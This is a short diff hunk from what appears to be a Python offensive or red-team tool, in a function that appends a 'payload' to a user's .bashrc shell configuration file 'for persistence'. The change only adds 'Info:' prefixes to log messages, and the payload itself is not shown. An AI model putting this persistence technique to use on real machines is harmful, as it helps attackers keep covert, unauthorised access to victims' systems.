@@ -49,11 +49,11 @@ def drop_profile_modification(platform, username):
         if os.path.exists(shell_config_file):
             with open(shell_config_file, "r") as f:
                 if payload in f.read():
-                    print("Payload already present in the shell configuration file.")
+                    print("Info: Payload already present in the shell configuration file.")
                 else:
                     with open(shell_config_file, "a") as f:
                         f.write(payload)
-                    print("Payload added to the shell configuration file for persistence.")
+                    print("Info: Payload added to the shell configuration file for persistence.")
             print(f"Info: Shell configuration file modified: {shell_config_file}")
         else:
             print("Warning: .bashrc file not found in the home")
